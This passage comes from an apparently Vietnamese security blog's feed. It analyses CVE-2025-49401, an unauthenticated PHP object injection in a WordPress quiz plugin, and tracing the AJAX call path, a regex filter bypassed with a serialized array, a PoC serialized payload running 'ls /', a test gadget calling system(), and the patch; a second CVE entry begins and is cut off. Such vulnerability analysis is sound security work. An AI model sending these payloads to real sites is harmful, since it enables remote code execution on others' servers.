same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_hidden_questions&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_nonce&amp;#34;&#xA;&#xA;b667038586&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_unique_key&amp;#34;&#xA;&#xA;691b485dd00e5&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;question1&amp;#34;&#xA;&#xA;0&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;answer_limit_keys_1&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qmn_question_list&amp;#34;&#xA;&#xA;1Q&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qmn_all_questions_count&amp;#34;&#xA;&#xA;1&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;total_questions&amp;#34;&#xA;&#xA;1&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;timer&amp;#34;&#xA;&#xA;3&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;timer_ms&amp;#34;&#xA;&#xA;0&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qmn_quiz_id&amp;#34;&#xA;&#xA;1&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;complete_quiz&amp;#34;&#xA;&#xA;confirmation&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;current_page&amp;#34;&#xA;&#xA;0&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;quiz_start_date&amp;#34;&#xA;&#xA;06:50:55 AM 11/17/2025&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;action&amp;#34;&#xA;&#xA;qmn_process_quiz&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;nonce&amp;#34;&#xA;&#xA;b667038586&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_unique_key&amp;#34;&#xA;&#xA;691b485dd00e5&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;currentuserTime&amp;#34;&#xA;&#xA;1763395682&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;currentuserTimeZone&amp;#34;&#xA;&#xA;Asia/Bangkok&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4--&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;qmn_sanitize_random_ids_data()&lt;/code&gt; sẽ gọi đến &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Nhưng trước hết phải đáp ứng điều kiện:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_POST[&amp;#39;quiz_answer_random_ids&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta có thể tận dụng 1 trường trong HTTP request ở trên để thêm thay đổi thành &lt;code&gt;quiz_answer_random_ids&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;- Content-Disposition: form-data; name=&amp;#34;currentuserTimeZone&amp;#34;&#xA;- Asia/Bangkok&#xA;&amp;#43; Content-Disposition: form-data; name=&amp;#34;quiz_answer_random_ids&amp;#34;&#xA;&amp;#43; payload&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chính value của &lt;code&gt;qmn_sanitize_random_ids&lt;/code&gt; sẽ là giá trị được đặt làm đối số cho hàm &lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;![Debug](Giá trị của qmn_sanitize_random_ids)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function qmn_sanitize_random_ids_data( $qmn_sanitize_random_ids ) {&#xA;&#x9;if ( is_string( $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;&#x9;return &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( is_serialized( $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;&#x9;$unserialized = maybe_unserialize( $qmn_sanitize_random_ids );&#xA;&#x9;&#x9;&#x9;if ( ! is_object( $unserialized ) &amp;amp;&amp;amp; ! is_resource( $unserialized ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;return $unserialized;&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return $qmn_sanitize_random_ids;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trước khi &lt;code&gt;maybe_unserialize&lt;/code&gt; được gọi, ta cần phải vượt qua bộ lọc duy nhất ở đây:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;preg_match&lt;/code&gt; kiểm tra xem trong chuỗi &lt;code&gt;$qmn_sanitize_random_ids&lt;/code&gt; có tồn tại chuỗi con bắt đầu bằng &lt;code&gt;O:&lt;/code&gt; hoặc &lt;code&gt;C:&lt;/code&gt;. Ví dụ &lt;code&gt;O:8:&amp;quot;stdClass&amp;quot;:...&lt;/code&gt; hoặc &lt;code&gt;C:...&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nhưng rất tiếc, lớp phòng thủ này chưa chặt. Chuỗi serialize có thể bắt đầu bằng &lt;code&gt;a:&lt;/code&gt; tức là array, trong array có thể chức &lt;code&gt;O:&lt;/code&gt; hoặc &lt;code&gt;C:&lt;/code&gt; để kích hoạt sự kiện deserialize, gây nguy cơ unserialize object injection.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Plugin đã đăng ký một ajax dành cho &lt;strong&gt;unauthenticated user&lt;/strong&gt; (nopriv)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_qmn_process_quiz&amp;#39;, array( $this, &amp;#39;ajax_submit_results&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi request đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=qmn_process_quiz&lt;/code&gt; thì callback &lt;code&gt;ajax_submit_results()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;p&gt;Sau đó &lt;code&gt;ajax_submit_results()&lt;/code&gt; sẽ gọi đến &lt;code&gt;submit_results()&lt;/code&gt;, encode JSON và echo giá trị trả về&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo wp_json_encode( $this-&amp;gt;submit_results( $options, $data ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;submit_results()&lt;/code&gt; gọi đến &lt;code&gt;display_results_text()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$results_pages   = $this-&amp;gt;display_results_text( $qmn_quiz_options, $qmn_array_for_variables );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;display_results_text()&lt;/code&gt; gọi đến &lt;code&gt;generate_pages()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return QSM_Results_Pages::generate_pages( $response_data );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_pages()&lt;/code&gt; sẽ apply filter đã được đăng ký trước &lt;code&gt;mlw_qmn_template_variable_results_page&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo apply_filters( &amp;#39;mlw_qmn_template_variable_results_page&amp;#39;, $page, $response_data );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#34; title=&#34;Rất nhiều callback được đăng ký&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/callback.png&#34; data-sub-html=&#34;&lt;h2&gt;Callback&lt;/h2&gt;&lt;p&gt;Rất nhiều callback được đăng ký&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#39; alt=&#34;Callback&#34; height=&#34;786&#34; width=&#34;1398&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Rất nhiều callback được đăng ký&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Có rất nhiều callback được đăng ký có filter &lt;code&gt;mlw_qmn_template_variable_results_page&lt;/code&gt;, nhưng ở đây ta chỉ quan tâm đến callback &lt;code&gt;mlw_qmn_variable_question_answers&lt;/code&gt;, nó sẽ trực tiếp gọi đến hàm &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt; ta đã phân tích ở trên.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;] -- action=qmn_process_quiz&amp;amp;other_post_data --&amp;gt; B[&amp;#34;wp_ajax_nopriv_qmn_process_quiz&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;ajax_submit_results()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;submit_results()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;display_results_text()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;generate_pages()&amp;#34;]&#xA;F -- apply filter mlw_qmn_template_variable_results_page --&amp;gt; G[&amp;#34;mlw_qmn_variable_question_answers()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;qsm_questions_answers_shortcode_to_text()&amp;#34;]&#xA;H --&amp;gt; K{&amp;#34; ! empty( $_POST[&amp;#39;quiz_answer_random_ids&amp;#39;] )&amp;#34;}&#xA;K -- true --&amp;gt; L[&amp;#34;qmn_sanitize_random_ids_data()&amp;#34;] --&amp;gt; M{&amp;#34;preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids )&amp;#34;}&#xA;M -- true --&amp;gt; N[&amp;#34;return &amp;#39;&amp;#39;&amp;#34;]&#xA;M -- false --&amp;gt; V[&amp;#34;maybe_unserialize&amp;#34;] --&amp;gt; W[&amp;#34;RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Sử dụng plugin để tạo post chứ quiz bằng việc sử dụng QSM block&lt;/li&gt;&#xA;&lt;li&gt;Submit form và cho request đi qua Burp proxy&lt;/li&gt;&#xA;&lt;li&gt;Sửa lại &lt;code&gt;value&lt;/code&gt; của &lt;code&gt;quiz_answer_random_ids&lt;/code&gt; chứa chuổi serialized&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;a:1:{i:0;O:15:&amp;#34;ObjectInjection&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls /&amp;#34;;}}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gửi lại request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Để test trên local, ta tạo class chứa magic method &lt;code&gt;__wakeup()&lt;/code&gt; sẽ tự kích hoạt khi deserialized đặt nó trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-49401&lt;/strong&gt; xuất phát từ việc xử lý dữ liệu đầu vào thiếu an toàn với &lt;code&gt;maybe_unserialize()&lt;/code&gt;, cho phép kẻ tấn công chưa xác thực cung cấp payload serialized để thực thi PHP Object Injection. Cơ chế lọc yếu dựa trên &lt;code&gt;preg_match&lt;/code&gt; chỉ chặn payload bắt đầu bằng &lt;code&gt;O:&lt;/code&gt; hoặc &lt;code&gt;C:&lt;/code&gt;, nhưng hoàn toàn thất bại trước serialized array chứa object. Kết hợp với endpoint AJAX mở (&lt;code&gt;wp_ajax_nopriv_qmn_process_quiz&lt;/code&gt;), luồng thực thi dẫn payload đi qua nhiều lớp xử lý trước khi bị unserialize, cuối cùng gây ra thực thi mã tùy ý (RCE) nếu tồn tại gadget phù hợp. Bản vá sử dụng &lt;code&gt;unserialize(..., [&#39;allowed_classes&#39; =&amp;gt; false])&lt;/code&gt; đã loại bỏ hoàn toàn khả năng tạo object, từ đó xử lý triệt để lỗ hổng.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;maybe_unserialize() luôn nguy hiểm&lt;/strong&gt; khi xử lý dữ liệu đến từ người dùng, đặc biệt trong môi trường WordPress.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Regex thủ công không đủ an toàn&lt;/strong&gt; để ngăn khai thác deserialization — attacker có thể đóng gói payload trong array để bypass.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;AJAX endpoint dành cho unauthenticated user&lt;/strong&gt; là bề mặt tấn công cực kỳ nhạy cảm và cần được kiểm tra nghiêm ngặt.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;allowed_classes = false&lt;/strong&gt; là biện pháp phòng thủ hiệu quả nhất khi không cần unserialize object.&lt;/li&gt;&#xA;&lt;li&gt;Tính năng plugin càng phức tạp, &lt;strong&gt;nguy cơ xuất hiện gadget chain dẫn đến RCE càng cao&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/quiz-master-next/vulnerability/wordpress-quiz-and-survey-master-plugin-10-2-5-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin &amp;lt;= 10.2.5 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9083 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-14-cve-2025-9083/</link>
      <pubDate>Fri, 14 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-14-cve-2025-9083/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin này thực hiện thao tác &lt;strong&gt;unserialize&lt;/strong&gt; dữ liệu mà người dùng gửi qua trường form, điều này có thể cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; thực hiện &lt;strong&gt;PHP Object Injection&lt;/strong&gt; nếu tồn tại một &lt;em&gt;gadget&lt;/em&gt; phù hợp trong hệ thống.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9083&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9083&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 